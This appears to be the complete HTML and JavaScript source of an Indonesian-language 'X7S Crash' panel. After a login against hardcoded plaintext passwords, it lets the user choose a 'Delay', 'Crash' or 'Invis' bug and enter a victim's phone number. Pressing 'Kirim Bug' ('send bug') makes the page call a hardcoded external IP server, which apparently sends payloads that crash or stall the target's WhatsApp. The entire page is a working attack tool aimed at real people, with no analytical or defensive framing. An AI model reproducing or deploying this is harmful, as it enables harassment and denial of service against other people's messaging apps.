<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>X7S Crash</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    body {
      margin: 0; padding: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #0a0a0a, #1a1a1a, #0f0f0f);
      height: 100vh; display: flex; align-items: center; justify-content: center;
      color: #eaeaea;
    }
    .glass-box {
      background: rgba(20, 20, 20, 0.9);
      border: 1px solid rgba(255, 255, 255, 0.05);
      border-radius: 18px; padding: 35px; width: 400px;
      text-align: center; color: #f5f5f5;
      box-shadow: 0 8px 30px rgba(0,0,0,0.7);
      backdrop-filter: blur(12px);
      margin: 10px;
    }
    h1 { margin-bottom: 20px; letter-spacing: 2px; }
    input, select {
      width: 90%; padding: 12px; margin: 8px 0;
      border: none; border-radius: 10px;
      outline: none; text-align: center;
      background: #111; color: #fff;
      border: 1px solid #333;
    }
    input:focus, select:focus {
      border: 1px solid #6a11cb;
      box-shadow: 0 0 8px #6a11cb;
    }
    button {
      width: 95%; padding: 12px; margin-top: 15px;
      border: none; border-radius: 10px;
      background: linear-gradient(90deg, #6a11cb, #2575fc);
      color: white; font-weight: bold; cursor: pointer;
      transition: 0.3s;
    }
    button:hover { transform: scale(1.05); opacity: 0.9; }
    .neon {
      color: #9d4edd;
      text-shadow: 0 0 8px #6a11cb, 0 0 16px #2575fc;
      font-weight: bold;
    }
    #logBox {
      margin-top: 15px; padding: 12px;
      background: rgba(0,0,0,0.6); border-radius: 12px;
      border: 1px solid #222;
      height: 140px; overflow-y: auto; font-size: 13px; text-align: left;
      color: #dcdcdc;
    }
    .log-success { color: #4ade80; }
    .log-error { color: #f87171; }
  </style>
</head>
<body>

<!-- Login Box -->
<div id="login-box" class="glass-box">
  <img src="https://files.catbox.moe/vqzawn.jpg" alt="logo" width="90" style="border-radius:50%; margin-bottom:15px; border: 2px solid #6a11cb; box-shadow:0 0 15px #6a11cb;">
  <h1 class="neon">X7S CRASH</h1>
  <input type="text" id="username" placeholder="Username">
  <input type="password" id="password" placeholder="Password">
  <button id="loginBtn"><i class="fas fa-sign-in-alt"></i> Login</button>
  <div id="login-result"></div>
</div>

<!-- Main Dashboard -->
<div class="glass-box" id="dashboard" style="display:none;">
  <h1 class="neon">Dashboard</h1>
  <p>Welcome, <span id="logged-user"></span> ⚡</p>
  
  <select id="bugType">
    <option value="Delay">Delay</option>
    <option value="Crash">Crash</option>
    <option value="Invis">Invis</option>
  </select>
  
  <input type="text" id="targetNumber" placeholder="628xxxx">
  <button onclick="sendAttack()"><i class="fas fa-bug"></i> Kirim Bug</button>
  <button onclick="logout()" style="background:linear-gradient(90deg,#ff1744,#d50000);"><i class="fas fa-sign-out-alt"></i> Logout</button>
  
  <div id="logBox"></div>
</div>

<script>
// daftar user (static)
let USERS = [
  { username: "xyroo", password: "1111" },
  { username: "admin", password: "2222" }
];

// API untuk tiap bug
const BUG_API = {
  Delay: "http://143.244.130.10:2168/saturn?type=saturnfc&chatId=",
  Crash: "http://143.244.130.10:2168/saturn?type=crash&chatId=",
  Invis: "http://143.244.130.10:2168/saturn?type=invis&chatId="
};

const loginBox = document.getElementById('login-box');
const dashboard = document.getElementById('dashboard');
const loginBtn = document.getElementById('loginBtn');
const loginResult = document.getElementById('login-result');
const loggedUser = document.getElementById('logged-user');
const logBox = document.getElementById('logBox');

let currentUser = null;

loginBtn.addEventListener('click', () => {
  const username = document.getElementById('username').value.trim();
  const password = document.getElementById('password').value.trim();

  const found = USERS.find(u => u.username === username && u.password === password);

  if (found) {
    loginBox.style.display = 'none';
    dashboard.style.display = 'block';
    currentUser = found;
    loggedUser.innerText = found.username;
  } else {
    loginResult.innerText = '❌ Username atau password salah!';
    loginResult.style.color = '#f87171';
  }
});

function appendLog(msg, type="info") {
  const div = document.createElement("div");
  div.innerText = msg;
  if (type === "success") div.classList.add("log-success");
  if (type === "error") div.classList.add("log-error");
  logBox.appendChild(div);
  logBox.scrollTop = logBox.scrollHeight;
}

function sendAttack() {
  const target = document.getElementById('targetNumber').value.trim();
  const bugType = document.getElementById('bugType').value;
  
  if (!target) {
    appendLog("⚠️ Masukkan nomor target!", "error");
    return;
  }

  const apiBase = BUG_API[bugType];
  if (!apiBase) {
    appendLog("❌ API untuk bug ini belum diatur!", "error");
    return;
  }

  const apiUrl = apiBase + target + "@s.whatsapp.net";

  fetch(apiUrl)
    .then(async res => {
      let body;
      try { body = await res.json(); } 
      catch { body = await res.text(); }
      if (res.ok) {
        appendLog("✅ Attack ["+bugType+"] sukses → " + JSON.stringify(body), "success");
      } else {
        appendLog("❌ Gagal ["+bugType+"] (HTTP " + res.status + ") → " + JSON.stringify(body), "error");
      }
    })
    .catch(err => {
      appendLog("❌ Error koneksi: " + err, "error");
    });
}

function logout() {
  dashboard.style.display = 'none';
  loginBox.style.display = 'block';
  currentUser = null;
}
</script>

</body>
</html>
